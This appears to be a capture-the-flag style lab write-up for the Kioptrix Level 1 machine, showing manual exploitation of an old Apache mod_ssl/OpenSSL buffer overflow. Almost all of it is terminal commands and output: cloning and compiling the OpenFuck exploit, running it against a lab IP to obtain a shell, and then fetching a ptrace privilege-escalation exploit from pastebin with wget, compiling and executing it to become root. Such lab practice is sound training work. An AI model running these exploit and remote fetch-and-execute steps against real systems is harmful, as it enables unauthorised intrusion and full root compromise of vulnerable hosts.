
# Manual Exploitation

Recap: We checked the vulnerability OpenLuck

- Potentially vulnerable to OpenFuckV2.c' Remote Buffer Overflow (1)
		- https://www.exploit-db.com/exploits/764 - # Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (1)
		- https://github.com/heltonWernik/OpenLuck

1. Follow the github https://github.com/heltonWernik/OpenLuck

	- Download the OpenFuck.c
```
┌──(root㉿kali)-[~/kioptrix]
└─# git clone https://github.com/heltonWernik/OpenFuck.git
Cloning into 'OpenFuck'...
remote: Enumerating objects: 26, done.
remote: Total 26 (delta 0), reused 0 (delta 0), pack-reused 26
Receiving objects: 100% (26/26), 14.14 KiB | 851.00 KiB/s, done.
Resolving deltas: 100% (6/6), done.

```

2. Install the ssl-dev library
```
┌──(root㉿kali)-[~/kioptrix]
└─# apt-get install libssl-dev
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
libssl-dev is already the newest version (3.2.1-3).
The following packages were automatically installed and are no longer required:
  dctrl-tools dh-dkms dh-elpa-helper golang-1.19 golang-1.19-doc golang-1.19-go golang-1.19-src libarmadillo11 libblockdev-crypto2 libblockdev-fs2
  libblockdev-loop2 libblockdev-part-err2 libblockdev-part2 libblockdev-swap2 libblockdev-utils2 libblockdev2 libcbor0.8 libcfitsio9 libgdal31 libgeos3.11.1
  libgupnp-igd-1.0-4 libjim0.81 libmongocrypt0 libmpdec3 libncurses5 libnfs13 libnsl-dev libobjc-12-dev libpoppler123 libprotobuf23 libpython3.10
  libpython3.10-minimal libpython3.10-stdlib libspatialite7 libsuperlu5 libtexluajit2 libtinfo5 libtirpc-dev libwebsockets17 libyara9 libzxingcore1
  linux-image-6.0.0-kali3-amd64 php8.1-mysql python-pastedeploy-tpl python3-commonmark python3-cryptography37 python3-flask-security python3-jaraco.classes
  python3-jdcal python3-promise python3-py python3-pytz-deprecation-shim python3-rx python3-speaklater python3-texttable ruby3.0 ruby3.0-dev ruby3.0-doc
Use 'apt autoremove' to remove them.
0 upgraded, 0 newly installed, 0 to remove and 1944 not upgraded.
```


3. Its compile time

```
──(root㉿kali)-[~/kioptrix]
└─# cd OpenFuck 

┌──(root㉿kali)-[~/kioptrix/OpenFuck]
└─# gcc -o open OpenFuck.c -lcrypto    

┌──(root㉿kali)-[~/kioptrix/OpenFuck]
└─# ls
open  OpenFuck.c  README.md


```

4. Execute the open `./open`
```
┌──(root㉿kali)-[~/kioptrix/OpenFuck]
└─# ./open 

*******************************************************************
* OpenFuck v3.0.32-root priv8 by SPABAM based on openssl-too-open *
*******************************************************************
* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *
* #hackarena  irc.brasnet.org                                     *
* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *
* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *
* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *
*******************************************************************

: Usage: ./open target box [port] [-c N]

  target - supported box eg: 0x00
  box - hostname or IP address
  port - port for ssl connection
  -c open N connections. (use range 40-50 if u dont know)

0x6b - RedHat Linux 7.2 (apache-1.3.20-16)2

```

We will be using 0x6b - RedHat Linux 7.2 (apache-1.3.20-16)2

```
┌──(root㉿kali)-[~/kioptrix/OpenFuck]
└─# ./open 0x6b 192.168.68.6 -c 40

*******************************************************************
* OpenFuck v3.0.32-root priv8 by SPABAM based on openssl-too-open *
*******************************************************************
* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *
* #hackarena  irc.brasnet.org                                     *
* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *
* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *
* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *
*******************************************************************

Connection... 40 of 40
Establishing SSL connection
cipher: 0x4043808c   ciphers: 0x80f8050
Ready to send shellcode
Spawning shell...
bash: no job control in this shell
bash-2.05$ 
race-kmod.c; gcc -o p ptrace-kmod.c; rm ptrace-kmod.c; ./p; m/raw/C7v25Xr9 -O pt 
--19:05:04--  https://pastebin.com/raw/C7v25Xr9
           => `ptrace-kmod.c'
Connecting to pastebin.com:443... connected!
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/plain]

    0K ...                                                    @ 655.27 KB/s

19:05:05 (655.27 KB/s) - `ptrace-kmod.c' saved [4026]

ptrace-kmod.c:183:1: warning: no newline at end of file
[+] Attached to 1807
[+] Waiting for signal
[+] Signal caught
[+] Shellcode placed at 0x4001189d
[+] Now wait for suid shell...
whoami
root
hostname
kioptrix.level1

```

